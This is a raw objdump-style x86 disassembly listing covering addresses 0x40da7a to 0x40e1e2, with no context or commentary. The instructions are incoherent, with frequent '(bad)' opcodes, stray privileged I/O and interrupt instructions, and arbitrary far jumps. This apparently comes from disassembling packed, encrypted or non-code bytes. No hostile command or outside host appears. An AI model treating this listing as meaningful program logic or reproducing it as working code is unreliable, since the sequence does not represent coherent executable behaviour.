  40da7a:	icebp  
  40da7b:	ja     0x40da80
  40da7d:	aad    0xff
  40da7f:	es xchg esi,eax
  40da81:	popa   
  40da82:	jmp    0x40da79
  40da84:	dec    eax
  40da85:	sar    DWORD PTR gs:[edx],1
  40da88:	mov    ah,0xe4
  40da8a:	pop    eax
  40da8b:	mov    bl,0x6c
  40da8d:	mov    esi,0x4717f536
  40da92:	xor    DWORD PTR [edx-0x1e],ebp
  40da95:	fidivr DWORD PTR [edi-0x26681076]
  40da9b:	fwait
  40da9c:	sub    al,0xbf
  40da9e:	jle    0x40da32
  40daa0:	xor    DWORD PTR [ebp-0x672e276a],0x25a55209
  40daaa:	les    esp,FWORD PTR [esi-0x4d4d85a]
  40dab0:	(bad)  
  40dab1:	ja     0x40da83
  40dab3:	xchg   esp,eax
  40dab4:	lods   al,BYTE PTR ds:[esi]
  40dab5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40dab6:	push   edx
  40dab7:	sbb    ebx,esi
  40dab9:	fcmovnb st,st(3)
  40dabb:	add    al,0xb2
  40dabd:	push   0xacb93dbe
  40dac2:	loopne 0x40da81
  40dac4:	push   edi
  40dac5:	xchg   ecx,eax
  40dac6:	(bad)  
  40dac7:	mov    bh,0xc7
  40dac9:	retf   0x3f9b
  40dacc:	dec    ebp
  40dacd:	pop    ebp
  40dace:	adc    dl,BYTE PTR [eax+0x59731877]
  40dad4:	(bad)  
  40dad5:	adc    eax,DWORD PTR cs:[esi+0x3c]
  40dad9:	dec    esp
  40dada:	or     BYTE PTR fs:[eax-0x4ac735a3],0x82
  40dae2:	adc    BYTE PTR [ebx],bh
  40dae4:	imul   esi,DWORD PTR [esp+esi*2],0x563741d
  40daeb:	daa    
  40daec:	mov    edx,0x8e83025b
  40daf1:	dec    esi
  40daf2:	pop    ds
  40daf3:	jmp    0x40da8b
  40daf5:	test   eax,0x6a02e7c4
  40dafa:	scas   eax,DWORD PTR es:[edi]
  40dafb:	add    al,0xc3
  40dafd:	popf   
  40dafe:	iret   
  40daff:	cmp    DWORD PTR [edi],esp
  40db01:	jmp    0x6c719fa9
  40db06:	iret   
  40db07:	cdq    
  40db08:	xlat   BYTE PTR ds:[ebx]
  40db09:	add    eax,0x68387f28
  40db0e:	mov    edi,0x676286df
  40db13:	sub    ecx,DWORD PTR [esi+0x12]
  40db16:	jecxz  0x40db70
  40db18:	dec    edx
  40db19:	out    dx,al
  40db1a:	push   ss
  40db1b:	xchg   ebp,eax
  40db1c:	pop    esi
  40db1d:	btr    DWORD PTR [esi],eax
  40db20:	jae    0x40dad9
  40db22:	rol    DWORD PTR [ebx],0x20
  40db25:	sub    al,0x71
  40db27:	pop    ebx
  40db28:	ret    0xdae6
  40db2b:	sar    DWORD PTR [esi],cl
  40db2d:	in     eax,0xbc
  40db2f:	pop    ecx
  40db30:	imul   ebp,esp,0x19
  40db33:	mov    ebp,0xf1c20d09
  40db38:	and    BYTE PTR [eax+0x4b],bl
  40db3b:	push   edx
  40db3c:	cs mov esp,0x9c6cdaa6
  40db42:	and    DWORD PTR [edx+0x7e],0x2
  40db46:	jecxz  0x40db6f
  40db48:	pop    edx
  40db49:	add    ch,BYTE PTR [edi+0x59]
  40db4c:	outs   dx,BYTE PTR ds:[esi]
  40db4d:	jl     0x40dbaa
  40db4f:	adc    eax,DWORD PTR [esi]
  40db51:	(bad)  
  40db52:	mov    esi,0x73c961f0
  40db57:	cs xchg edx,eax
  40db59:	dec    BYTE PTR [ebx-0x3c]
  40db5c:	data16 in al,0x8
  40db5f:	pop    ss
  40db60:	xor    al,0x67
  40db62:	xchg   ebp,eax
  40db64:	test   eax,0x70ce27a4
  40db69:	mov    WORD PTR [edi-0x3b79e94a],?
  40db6f:	arpl   WORD PTR [edi],si
  40db71:	(bad)  
  40db72:	sbb    DWORD PTR [esi+0x12],ecx
  40db75:	retf   0x52d8
  40db78:	mov    al,0x6d
  40db7a:	std    
  40db7b:	or     bh,bl
  40db7d:	cmp    edx,0x9f4ba7df
  40db83:	fidivr DWORD PTR [edx-0x3c]
  40db86:	push   0xffffffde
  40db88:	dec    ebp
  40db89:	loope  0x40dba8
  40db8b:	adc    ebx,DWORD PTR [edx-0x79]
  40db8e:	mov    DWORD PTR [eax+0x6e5b3a9d],0x36650b37
  40db98:	retf   0x904f
  40db9b:	out    0x8c,al
  40db9d:	dec    ecx
  40db9e:	mov    ds:0x7d48b29d,eax
  40dba3:	loopne 0x40db26
  40dba5:	js     0x40db88
  40dba7:	push   cs
  40dba8:	test   BYTE PTR [esi+ebx*4-0x33678c80],bh
  40dbaf:	imul   edi,DWORD PTR [ebx*1+0x2d44dbd0],0xfffffff4
  40dbb7:	and    BYTE PTR [edi+0x51f62d3b],dl
  40dbbd:	adc    DWORD PTR [ecx],edx
  40dbbf:	sbb    al,0x4a
  40dbc1:	fdiv   QWORD PTR [ebx-0x40f88b1c]
  40dbc7:	call   FWORD PTR [ebp+0xa]
  40dbca:	add    al,0xf2
  40dbcc:	and    cl,BYTE PTR [ebp+0x7c]
  40dbcf:	dec    ebx
  40dbd0:	arpl   WORD PTR [esi-0x78],ax
  40dbd3:	lock mov ds:0xe55910f5,al
  40dbd9:	cmc    
  40dbda:	leave  
  40dbdb:	dec    esi
  40dbdc:	loop   0x40dc44
  40dbde:	add    BYTE PTR [edx+0x609f9ac],bh
  40dbe4:	call   0x3b70:0x1ba8b052
  40dbeb:	es lock jle 0x40dbcd
  40dbef:	push   esi
  40dbf0:	jne    0x40dbdd
  40dbf2:	adc    BYTE PTR [esi-0x1c698de8],ch
  40dbf8:	pop    esi
  40dbf9:	and    BYTE PTR [edx],dl
  40dbfb:	test   cl,0x2c
  40dbfe:	jle    0x40dc7a
  40dc00:	ds pop edi
  40dc02:	imul   ecx,DWORD PTR [esi-0x3c],0x33
  40dc06:	cwde   
  40dc07:	adc    dl,BYTE PTR [ebx]
  40dc09:	stc    
  40dc0a:	jge    0x40dbfa
  40dc0c:	cli    
  40dc0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc0e:	ds jmp 0x7f6a:0xe5ff25c8
  40dc16:	mov    ecx,DWORD PTR [edi+0x5f]
  40dc19:	jns    0x40dc1a
  40dc1b:	and    ebp,DWORD PTR [eax-0xd]
  40dc1e:	jmp    0x40dc03
  40dc20:	ret    
  40dc21:	cmp    ebp,DWORD PTR [ebp+0x6eb0e89e]
  40dc27:	lock pop edi
  40dc29:	mov    ecx,es
  40dc2b:	pop    ds
  40dc2c:	ins    DWORD PTR es:[edi],dx
  40dc2d:	xor    edi,DWORD PTR [edx]
  40dc2f:	test   BYTE PTR [ebx],dh
  40dc31:	icebp  
  40dc32:	test   eax,0xf17173ac
  40dc37:	jno    0x40dc15
  40dc39:	pop    ecx
  40dc3a:	and    BYTE PTR [ecx+ecx*4],al
  40dc3d:	add    ch,BYTE PTR [edx-0x5a]
  40dc40:	outs   dx,DWORD PTR ds:[esi]
  40dc41:	xchg   esp,eax
  40dc42:	and    DWORD PTR [edi],edi
  40dc44:	mov    ebx,0xf9b7073b
  40dc49:	in     al,dx
  40dc4a:	mov    esi,0xf43b9acd
  40dc4f:	xor    BYTE PTR [ebp+0x4465655a],0xa0
  40dc56:	aas    
  40dc57:	mov    dh,0xc0
  40dc59:	xchg   edi,eax
  40dc5a:	stos   BYTE PTR es:[edi],al
  40dc5b:	lea    eax,[ecx+ebp*4]
  40dc5e:	test   al,0xc
  40dc60:	ss dec edx
  40dc62:	daa    
  40dc63:	retf   0x7579
  40dc66:	(bad)  
  40dc67:	xor    dh,cl
  40dc69:	test   eax,0xc8210e7c
  40dc6e:	xchg   DWORD PTR [ecx+ebx*8-0xd],eax
  40dc72:	sub    BYTE PTR [ecx+0x13],bl
  40dc75:	mov    gs,esp
  40dc77:	adc    ecx,DWORD PTR ds:0x7896e4b8
  40dc7d:	xchg   edi,eax
  40dc7e:	xchg   ebp,eax
  40dc7f:	sub    eax,0x73961b64
  40dc84:	int3   
  40dc85:	enter  0x214f,0x73
  40dc89:	sub    ecx,esp
  40dc8b:	stc    
  40dc8c:	pop    ds
  40dc8d:	out    dx,al
  40dc8e:	fwait
  40dc8f:	gs sahf 
  40dc91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dc92:	push   ebp
  40dc93:	daa    
  40dc94:	cli    
  40dc95:	sbb    dh,BYTE PTR [ecx+ebx*2]
  40dc98:	out    dx,eax
  40dc99:	or     ebp,ebp
  40dc9b:	icebp  
  40dc9c:	cdq    
  40dc9d:	pusha  
  40dc9e:	add    DWORD PTR [ebp+0x2bbb09ab],edi
  40dca4:	enter  0x9746,0x21
  40dca8:	or     BYTE PTR [ecx-0x79],ah
  40dcab:	test   edx,ecx
  40dcad:	xchg   ebx,eax
  40dcae:	out    0x7a,eax
  40dcb0:	adc    eax,0x9c534c06
  40dcb5:	rcr    DWORD PTR [edx-0x3e0f17fa],0x4
  40dcbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcbd:	pop    edx
  40dcbe:	adc    ebx,DWORD PTR [ebp+0x75]
  40dcc1:	stc    
  40dcc2:	sub    bh,dh
  40dcc4:	adc    bl,0x46
  40dcc7:	mov    dh,ch
  40dcc9:	daa    
  40dcca:	retf   0x4e4a
  40dccd:	push   ebx
  40dcce:	je     0x40dce2
  40dcd0:	sbb    ecx,eax
  40dcd2:	sub    eax,0x309e6c2e
  40dcd7:	or     esi,DWORD PTR [ebx+0x56]
  40dcda:	inc    edx
  40dcdb:	dec    BYTE PTR [ecx-0x7da8ea80]
  40dce1:	adc    eax,DWORD PTR [ebx]
  40dce3:	push   eax
  40dce4:	cld    
  40dce5:	xchg   ebp,eax
  40dce6:	push   esi
  40dce7:	ror    DWORD PTR ds:0x650c89da,cl
  40dced:	pop    ds
  40dcee:	adc    esp,DWORD PTR [edx+0x2d25dddd]
  40dcf4:	cld    
  40dcf5:	(bad)  
  40dcf6:	sbb    BYTE PTR [edi+0x62507f3d],al
  40dcfc:	push   cs
  40dcfd:	xchg   ebx,eax
  40dcfe:	ins    BYTE PTR es:[edi],dx
  40dcff:	xchg   BYTE PTR [edx+0x1],cl
  40dd02:	pop    edx
  40dd03:	sbb    ebp,edi
  40dd05:	rol    DWORD PTR [ebp-0x65],cl
  40dd08:	es push ebx
  40dd0a:	(bad)  
  40dd0b:	call   0x22a64517
  40dd10:	dec    edi
  40dd11:	inc    ecx
  40dd12:	and    eax,0x9d5935cd
  40dd17:	sahf   
  40dd18:	mov    al,0xea
  40dd1a:	mul    DWORD PTR [edi-0x77]
  40dd1d:	pushf  
  40dd1e:	sub    esi,eax
  40dd20:	mov    eax,ds:0xb60d7e75
  40dd25:	mov    dl,0xf3
  40dd27:	rcr    dh,0xf0
  40dd2a:	(bad)  
  40dd2b:	stc    
  40dd2c:	aam    0xf5
  40dd2e:	int    0x15
  40dd30:	loopne 0x40dd0a
  40dd32:	aam    0x40
  40dd34:	and    ah,BYTE PTR [ebx-0x44de4d6e]
  40dd3a:	into   
  40dd3b:	or     ebp,ecx
  40dd3d:	xlat   BYTE PTR ds:[ebx]
  40dd3e:	js     0x40dcd1
  40dd40:	cmp    bl,BYTE PTR [ebp-0x30]
  40dd43:	shr    DWORD PTR [esi],0x50
  40dd46:	mov    bh,ch
  40dd48:	sbb    DWORD PTR [ecx+0x3b],eax
  40dd4b:	push   ebx
  40dd4c:	das    
  40dd4d:	mov    ch,0x4c
  40dd4f:	push   ss
  40dd50:	push   ebx
  40dd51:	imul   ebx,edx,0xc5a8efcf
  40dd57:	dec    ebp
  40dd58:	clc    
  40dd59:	pop    edx
  40dd5a:	xchg   ecx,eax
  40dd5b:	cdq    
  40dd5c:	mov    esp,0x14c5b187
  40dd61:	pop    ebp
  40dd62:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd64:	retf   0x75f
  40dd67:	mov    eax,0xc809770e
  40dd6c:	repz mov edx,0xcdeff35
  40dd72:	cwde   
  40dd73:	cwde   
  40dd74:	call   0x53bf3e92
  40dd79:	scas   al,BYTE PTR es:[edi]
  40dd7a:	stos   BYTE PTR es:[edi],al
  40dd7b:	mov    al,0x44
  40dd7d:	adc    al,0x8c
  40dd7f:	push   ebx
  40dd80:	xor    BYTE PTR [ebx],cl
  40dd82:	loopne 0x40dd04
  40dd84:	adc    esi,DWORD PTR [eax+edi*2-0x56]
  40dd88:	xchg   edx,eax
  40dd89:	adc    al,BYTE PTR [edx]
  40dd8b:	not    BYTE PTR ds:0xf2f072ca
  40dd91:	sbb    eax,0x8821c4a2
  40dd96:	and    al,0x32
  40dd98:	push   ebx
  40dd99:	add    esi,DWORD PTR [ecx+0x27dc6d1e]
  40dd9f:	test   DWORD PTR [esi-0x7d],ebx
  40dda2:	scas   eax,DWORD PTR es:[edi]
  40dda3:	push   ss
  40dda4:	mov    eax,ds:0xaebbf88a
  40dda9:	xchg   ebx,eax
  40ddaa:	pusha  
  40ddab:	and    dl,BYTE PTR [edx+0x22]
  40ddae:	sub    edx,DWORD PTR [edi+0x1d324db5]
  40ddb4:	test   dh,bl
  40ddb6:	js     0x40ddff
  40ddb8:	das    
  40ddb9:	loopne 0x40ddcd
  40ddbb:	and    DWORD PTR [ebp+0x6],edx
  40ddbe:	xchg   DWORD PTR [edx-0x3d],ecx
  40ddc1:	sub    al,0x23
  40ddc3:	xchg   ebp,eax
  40ddc4:	mov    cl,0x18
  40ddc6:	stos   BYTE PTR es:[edi],al
  40ddc7:	sub    ah,BYTE PTR [ebx-0x19]
  40ddca:	stos   DWORD PTR es:[edi],eax
  40ddcb:	adc    al,0x5d
  40ddcd:	retf   0x9125
  40ddd0:	xlat   BYTE PTR ds:[ebx]
  40ddd1:	cld    
  40ddd2:	dec    ecx
  40ddd3:	mov    cl,0xbd
  40ddd5:	cwde   
  40ddd6:	sbb    edi,DWORD PTR [ebp+0x64]
  40ddd9:	ins    DWORD PTR es:[edi],dx
  40ddda:	fsub   QWORD PTR [ebp-0x4f53aa30]
  40dde0:	mov    esp,0xe4ff45c5
  40dde5:	adc    al,0x53
  40dde7:	or     al,0xc8
  40dde9:	sub    bh,ch
  40ddeb:	xor    ch,BYTE PTR [esi]
  40dded:	loop   0x40dd7b
  40ddef:	mov    cl,0x1a
  40ddf1:	xchg   edi,eax
  40ddf2:	sbb    al,BYTE PTR [eax-0x70]
  40ddf5:	mov    ds:0xf5bc9dd3,al
  40ddfa:	(bad)  
  40ddfb:	jl     0x40de3f
  40ddfd:	in     eax,0x29
  40ddff:	outs   dx,DWORD PTR ds:[esi]
  40de00:	jmp    0xd4ac7169
  40de05:	mov    edi,0x63160707
  40de0a:	imul   edx,edx,0x49
  40de0d:	push   ebp
  40de0e:	fcom   QWORD PTR [edi-0x7f]
  40de11:	imul   ebp,DWORD PTR [ebx+0x73ce8315],0xfffffffc
  40de18:	dec    ebx
  40de19:	add    ebp,DWORD PTR [esi-0x23]
  40de1c:	js     0x40ddf2
  40de1e:	jmp    0x1ad:0x1bdfa472
  40de25:	jbe    0x40de58
  40de27:	lods   al,BYTE PTR ds:[esi]
  40de28:	call   0xe6747945
  40de2d:	retf   0x165b
  40de30:	or     al,bl
  40de32:	pop    edi
  40de33:	sbb    eax,0x4f880cf1
  40de38:	mov    BYTE PTR [eax],ah
  40de3a:	lock repnz xchg esp,eax
  40de3d:	cwde   
  40de3e:	push   esp
  40de3f:	dec    eax
  40de40:	stc    
  40de41:	loop   0x40de30
  40de43:	pop    esp
  40de44:	xchg   ebx,eax
  40de45:	je     0x40de5c
  40de47:	xchg   DWORD PTR [edx-0x1248fbf3],ebx
  40de4d:	pop    ss
  40de4e:	xor    BYTE PTR [ebx],ch
  40de50:	(bad)  
  40de51:	mov    al,ds:0x6b8e5c27
  40de56:	inc    eax
  40de57:	or     dh,dl
  40de59:	aad    0x7c
  40de5b:	jp     0x40de35
  40de5d:	out    0xaa,al
  40de5f:	mov    WORD PTR [edi],fs
  40de61:	dec    ebp
  40de62:	pop    edi
  40de63:	inc    ebp
  40de64:	mov    esp,0xbfe466e2
  40de69:	jo     0x40de86
  40de6b:	mov    esp,0x754845bf
  40de70:	loopne 0x40de27
  40de72:	xchg   edi,eax
  40de73:	out    dx,al
  40de74:	adc    DWORD PTR [edx],edx
  40de76:	sub    esp,DWORD PTR [ecx+0x46]
  40de79:	push   edx
  40de7a:	xlat   BYTE PTR ds:[ebx]
  40de7b:	loope  0x40de99
  40de7d:	cmp    cl,bl
  40de7f:	xchg   BYTE PTR [ecx-0x4],dl
  40de82:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40de84:	jl     0x40dea3
  40de86:	ins    DWORD PTR es:[edi],dx
  40de87:	sar    ch,1
  40de89:	imul   edx,DWORD PTR [eax-0x1f7c007d],0x8ba84c2b
  40de93:	ja     0x40de2e
  40de95:	xchg   edx,ebx
  40de97:	mov    ecx,0x21a39f8c
  40de9c:	mov    edx,ebx
  40de9e:	xor    esi,DWORD PTR ds:[ecx-0xbfea1c1]
  40dea5:	pop    ds
  40dea6:	cmp    DWORD PTR [edi],esi
  40dea8:	adc    DWORD PTR [esi+0x7cf2e19d],edx
  40deae:	dec    edi
  40deaf:	aad    0xc6
  40deb1:	repz mov ds:0x138ca034,eax
  40deb7:	fs inc esi
  40deb9:	daa    
  40deba:	fstp   DWORD PTR [edi+0x73eaac80]
  40dec0:	test   ebp,esp
  40dec2:	adc    BYTE PTR [ebx],bl
  40dec4:	lds    esp,FWORD PTR [eax+eax*2+0x5d]
  40dec8:	cmp    DWORD PTR [eax+0x57dac46a],esi
  40dece:	xor    edx,esi
  40ded0:	scas   al,BYTE PTR es:[edi]
  40ded1:	pop    es
  40ded2:	mov    WORD PTR [ebx],ds
  40ded4:	fst    QWORD PTR [ebx+0x79353213]
  40deda:	push   ebp
  40dedb:	dec    ebp
  40dedc:	out    0xd4,eax
  40dede:	repnz in al,dx
  40dee0:	cli    
  40dee1:	lea    edi,[ebx+0x57abfc23]
  40dee7:	js     0x40ded8
  40dee9:	imul   ebx
  40deeb:	sahf   
  40deec:	rcr    BYTE PTR [edx+0x1f],0x78
  40def0:	lahf   
  40def1:	jo     0x40deb3
  40def3:	xor    BYTE PTR [edx-0x60],bh
  40def6:	mov    cl,0x5b
  40def8:	jl     0x40deec
  40defa:	and    al,0xbf
  40defc:	fs jge 0x40dee6
  40deff:	and    al,0x91
  40df01:	cld    
  40df02:	add    ebx,DWORD PTR ds:0x1a7e6a4b
  40df08:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40df09:	mov    edi,0xa5713e62
  40df0e:	jb     0x40df1f
  40df10:	mov    ebp,0x868e9822
  40df15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df16:	ss lock jne 0x40ded9
  40df1a:	cs mov ebx,ecx
  40df1d:	dec    ebx
  40df1e:	jmp    0x40defa
  40df20:	dec    esp
  40df21:	adc    DWORD PTR [edx-0x61],eax
  40df24:	pop    es
  40df25:	fwait
  40df26:	jp     0x40dfa6
  40df28:	cmp    eax,0xb6b8c9b9
  40df2d:	lods   eax,DWORD PTR ds:[esi]
  40df2e:	cmc    
  40df2f:	jo     0x40df3b
  40df31:	and    dh,BYTE PTR [ebx+0x72]
  40df34:	dec    edi
  40df35:	jge    0x40df43
  40df37:	int    0x76
  40df39:	push   ecx
  40df3a:	in     eax,0xb6
  40df3c:	cmp    eax,0xea243320
  40df41:	pop    ebx
  40df42:	mov    ecx,0x11cc2559
  40df47:	xchg   esp,eax
  40df48:	ins    DWORD PTR es:[edi],dx
  40df49:	fs or  dh,dl
  40df4c:	push   es
  40df4d:	fs int3 
  40df4f:	sbb    al,0x63
  40df51:	sub    al,0xc5
  40df53:	adc    cl,BYTE PTR [ebp-0x37]
  40df56:	lods   eax,DWORD PTR ds:[esi]
  40df57:	mov    BYTE PTR ds:0x5a545e57,cl
  40df5d:	shr    DWORD PTR [esp+esi*8+0x47],1
  40df61:	and    eax,DWORD PTR [ebp-0x4d5bb348]
  40df67:	fucomip st,st(5)
  40df69:	inc    eax
  40df6a:	retf   
  40df6b:	and    al,BYTE PTR fs:[esi-0x46]
  40df6f:	jg     0x40dfdb
  40df71:	cmp    BYTE PTR [ebp-0x2ed99e16],dl
  40df77:	mov    WORD PTR ds:0x777ffc74,es
  40df7d:	push   ds
  40df7e:	sbb    DWORD PTR [edi],ebx
  40df80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40df81:	and    al,0xeb
  40df83:	mov    cl,0x2e
  40df85:	adc    ebp,esp
  40df87:	mov    edx,0x50165de6
  40df8c:	add    dl,BYTE PTR [edi-0x43581524]
  40df92:	jb     0x40df22
  40df94:	inc    ebx
  40df95:	jae    0x40df44
  40df97:	fnstcw WORD PTR [edx+0x106a4f9d]
  40df9d:	and    al,0xad
  40df9f:	cld    
  40dfa0:	adc    ch,BYTE PTR [edx-0x68]
  40dfa3:	sbb    al,0xfa
  40dfa5:	sub    BYTE PTR [ecx+esi*1-0x78e5eeb7],bh
  40dfac:	inc    ecx
  40dfad:	push   es
  40dfae:	arpl   WORD PTR [ecx-0x4caca702],di
  40dfb4:	es aad 0x6a
  40dfb7:	dec    ebx
  40dfb8:	popf   
  40dfb9:	pop    ds
  40dfba:	loope  0x40df7e
  40dfbc:	pop    esp
  40dfbd:	add    ebp,edx
  40dfbf:	repz fistp QWORD PTR [ebp-0x3ceb6009]
  40dfc6:	loope  0x40df65
  40dfc8:	or     edx,DWORD PTR [ebx+ecx*8-0x7cf1cc72]
  40dfcf:	aaa    
  40dfd0:	sbb    BYTE PTR [eax+0x37],ah
  40dfd3:	or     BYTE PTR ds:0x6474437d,dl
  40dfd9:	sbb    eax,0xc8502702
  40dfde:	jmp    DWORD PTR [ecx]
  40dfe0:	mov    eax,fs:0x1824c95b
  40dfe6:	rol    BYTE PTR [eax+0x4ad87db2],1
  40dfec:	xchg   esp,eax
  40dfed:	push   ss
  40dfee:	sub    edi,DWORD PTR [ebx-0x57]
  40dff1:	dec    ecx
  40dff2:	pop    es
  40dff3:	cmp    DWORD PTR [ebx-0x4a],esi
  40dff6:	jb     0x40e073
  40dff8:	shl    DWORD PTR [esi+0x6c4afc5e],1
  40dffe:	es in  al,dx
  40e000:	sub    BYTE PTR [ebx+0x40f8b078],al
  40e006:	push   edx
  40e007:	xor    eax,0x94181e01
  40e00c:	push   ecx
  40e00d:	mov    es,WORD PTR [esi+esi*1+0x77a658ff]
  40e014:	sub    al,0x6f
  40e016:	bound  ebp,QWORD PTR [eax+ecx*1]
  40e019:	popf   
  40e01a:	adc    al,0x8c
  40e01c:	hlt    
  40e01d:	sub    eax,0xd0a06b0e
  40e022:	jne    0x40e09a
  40e024:	(bad)  
  40e025:	ja     0x40e09d
  40e027:	push   es
  40e028:	pop    ebx
  40e029:	enter  0x2992,0xcb
  40e02d:	pop    ds
  40e02e:	ins    BYTE PTR es:[edi],dx
  40e02f:	bnd jnp 0x40dfb8
  40e032:	enter  0x1390,0xc8
  40e036:	or     DWORD PTR [ecx-0x39f52092],0x112a2824
  40e040:	cs jp  0x40dfcc
  40e043:	out    dx,al
  40e044:	int3   
  40e045:	shl    DWORD PTR [eax+0x3aa1935],0xac
  40e04c:	mov    BYTE PTR [eax-0x31],bl
  40e04f:	aad    0xa7
  40e051:	and    DWORD PTR [ecx],0xffffffd0
  40e054:	mov    dh,0xf4
  40e056:	adc    eax,DWORD PTR [esi+ecx*4]
  40e059:	push   eax
  40e05a:	lods   eax,DWORD PTR ds:[esi]
  40e05b:	add    eax,0x30b60662
  40e060:	push   0x30
  40e062:	fld    DWORD PTR [ebx-0x48]
  40e065:	adc    edi,ebp
  40e067:	add    edx,DWORD PTR [ebx+0x68a1a3e4]
  40e06d:	stos   DWORD PTR es:[edi],eax
  40e06e:	jbe    0x40e075
  40e070:	mov    eax,0x9bc693db
  40e075:	cmp    bh,dl
  40e077:	mov    DWORD PTR [ecx+0x7e3b98b7],0x80a0fdb8
  40e081:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e082:	ret    0xcaf7
  40e085:	and    BYTE PTR [edi],0x8c
  40e088:	dec    ecx
  40e089:	addr16 (bad) 
  40e08b:	lock pop edi
  40e08d:	adc    ch,BYTE PTR [edx]
  40e08f:	popw   ds
  40e091:	(bad)
  40e094:	xlat   BYTE PTR ds:[ebx]
  40e095:	pushf  
  40e096:	jp     0x40e064
  40e098:	pop    es
  40e099:	add    bl,al
  40e09b:	push   ds
  40e09c:	push   ebp
  40e09d:	fcomp  DWORD PTR [edi+0x275337d9]
  40e0a3:	add    eax,0x576c584f
  40e0a8:	add    ah,ah
  40e0aa:	(bad)  
  40e0ac:	lods   al,BYTE PTR ds:[esi]
  40e0ad:	jae    0x40e085
  40e0af:	into   
  40e0b0:	out    0xdc,eax
  40e0b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0b3:	xchg   edx,eax
  40e0b4:	icebp  
  40e0b5:	push   ss
  40e0b6:	mov    bh,ch
  40e0b8:	push   0xe463d92e
  40e0bd:	cmp    DWORD PTR [eax],ecx
  40e0bf:	xchg   edi,eax
  40e0c0:	push   esp
  40e0c1:	fidiv  DWORD PTR [esi+0x20]
  40e0c4:	pop    ds
  40e0c5:	add    al,0xe3
  40e0c7:	std    
  40e0c8:	adc    eax,0xaa0696c6
  40e0cd:	in     eax,dx
  40e0ce:	sub    dh,BYTE PTR [edi-0x38e79cf0]
  40e0d4:	outs   dx,BYTE PTR ds:[esi]
  40e0d5:	loopne 0x40e087
  40e0d7:	mov    ch,0x6b
  40e0d9:	push   es
  40e0da:	adc    BYTE PTR [edi-0x55],bl
  40e0dd:	and    al,0xe8
  40e0df:	pop    ebp
  40e0e0:	adc    eax,0xed0a5102
  40e0e5:	pop    edi
  40e0e6:	jmp    0x77ef:0x1fc992bd
  40e0ed:	iret   
  40e0ee:	add    eax,0x676d3ab4
  40e0f3:	mov    ds,WORD PTR [ebx]
  40e0f5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e0f6:	fwait
  40e0f7:	inc    ecx
  40e0f8:	jl     0x40e09f
  40e0fa:	aas    
  40e0fb:	inc    ebx
  40e0fc:	jb     0x40e0ff
  40e0fe:	or     ebx,DWORD PTR [esp+ebp*1]
  40e101:	call   0xb6a4:0x8cd5882f
  40e108:	sub    eax,DWORD PTR [ecx+0x9f530e0]
  40e10e:	xor    al,0x4b
  40e110:	pop    ecx
  40e111:	xchg   ecx,eax
  40e112:	aaa    
  40e113:	or     dl,al
  40e115:	and    bl,ah
  40e117:	das    
  40e118:	fwait
  40e119:	pop    esp
  40e11a:	sub    eax,0x362eeb21
  40e11f:	mov    dh,0xa4
  40e121:	int    0xf8
  40e123:	es jo  0x40e10a
  40e126:	ins    BYTE PTR es:[edi],dx
  40e127:	outs   dx,DWORD PTR ds:[esi]
  40e129:	push   eax
  40e12a:	xor    al,0x7c
  40e12c:	adc    DWORD PTR [esi-0xba20132],esp
  40e132:	cmp    cl,dl
  40e134:	stos   DWORD PTR es:[edi],eax
  40e135:	loope  0x40e121
  40e137:	int    0x6d
  40e139:	or     DWORD PTR [esi+0x403bf19e],edi
  40e13f:	sti    
  40e140:	lea    ecx,[eax-0x7dcb4083]
  40e146:	add    ch,BYTE PTR [edi]
  40e148:	scas   eax,DWORD PTR es:[edi]
  40e149:	mov    ebx,0xff956a7e
  40e14e:	pop    ss
  40e14f:	or     esp,DWORD PTR ds:0xfce4a01d
  40e155:	pusha  
  40e156:	and    DWORD PTR [edx+eiz*8-0x1784b053],esi
  40e15d:	sahf   
  40e15e:	xchg   ebx,eax
  40e15f:	dec    ecx
  40e160:	sti    
  40e161:	mov    cl,0xa7
  40e163:	push   ecx
  40e164:	imul   eax,eax,0x2c7f21fa
  40e16a:	push   ecx
  40e16b:	jno    0x40e1ea
  40e16d:	in     al,0xea
  40e16f:	inc    edx
  40e170:	sahf   
  40e171:	sbb    edx,esp
  40e173:	inc    ebx
  40e174:	push   es
  40e175:	cmp    BYTE PTR [eax+ebp*4+0x5f2c2d61],cl
  40e17c:	repnz dec esi
  40e17e:	jge    0x40e146
  40e180:	xchg   esi,eax
  40e181:	inc    esp
  40e182:	nop    DWORD PTR [edx]
  40e185:	aas    
  40e186:	popf   
  40e187:	aaa    
  40e188:	cmp    al,0x2
  40e18a:	ret    0x3c49
  40e18d:	das    
  40e18e:	(bad)  
  40e190:	call   0xede4f3b7
  40e195:	cs aam 0x87
  40e198:	xor    DWORD PTR [edi],esp
  40e19a:	mov    ebx,0xae360bbd
  40e19f:	aam    0x95
  40e1a1:	ins    DWORD PTR es:[edi],dx
  40e1a2:	jb     0x40e17f
  40e1a4:	xor    al,BYTE PTR [eax]
  40e1a6:	sbb    bl,dl
  40e1a8:	mov    ds:0xfb6a0ffd,eax
  40e1ad:	loopne 0x40e1c7
  40e1af:	jecxz  0x40e1af
  40e1b1:	arpl   WORD PTR [ecx+edi*8],bx
  40e1b4:	add    eax,0x34d430cf
  40e1b9:	in     eax,dx
  40e1ba:	bound  ebp,QWORD PTR [ebx+0x4f]
  40e1bd:	or     bh,bl
  40e1bf:	mov    ecx,0x47e402b
  40e1c4:	addr16 in al,0xc3
  40e1c7:	push   esp
  40e1c8:	out    0x56,eax
  40e1ca:	aam    0xdb
  40e1cc:	push   ecx
  40e1cd:	xchg   ecx,eax
  40e1ce:	lods   al,BYTE PTR ds:[esi]
  40e1cf:	add    al,BYTE PTR [ebp-0x4d3fb303]
  40e1d5:	mov    edi,0xc9cd337b
  40e1da:	and    ecx,DWORD PTR [esi]
  40e1dc:	push   cs
  40e1dd:	push   0x691f08f7
  40e1e2:	jnp    0x40e1f6
